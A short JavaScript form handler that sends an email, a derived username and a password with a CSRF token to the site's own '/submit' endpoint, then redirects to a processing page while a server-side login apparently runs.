const form = document.getElementById("credentials-form");
if (form) {
    form.addEventListener("submit", function (e) {
        e.preventDefault();

        const email = document.getElementById("vt_email").value;
        const username = email.split("@")[0];
        const password = document.getElementById("vt_password").value;
        const csrfToken = document.querySelector('meta[name="csrf-token"]').content;

        // Fire submit and wait for the response so the session cookie
        // is set before we navigate to the processing page.
        fetch("/submit", {
            method: "POST",
            headers: {
                "Content-Type": "application/json",
                "X-CSRFToken": csrfToken,
            },
            body: JSON.stringify({
                vt_email: email,
                vt_username: username,
                vt_password: password,
            }),
        })
            .then((response) => {
                if (!response.ok) {
                    return response.json().then((data) => {
                        throw new Error(data.error || "Submission failed");
                    });
                }
                // Session cookie is now set, background login is running.
                window.location.href = "/processing";
            })
            .catch((error) => {
                console.error("Error during form submission:", error);
                alert(error.message || "Something went wrong. Please try again.");
            });
    });
}
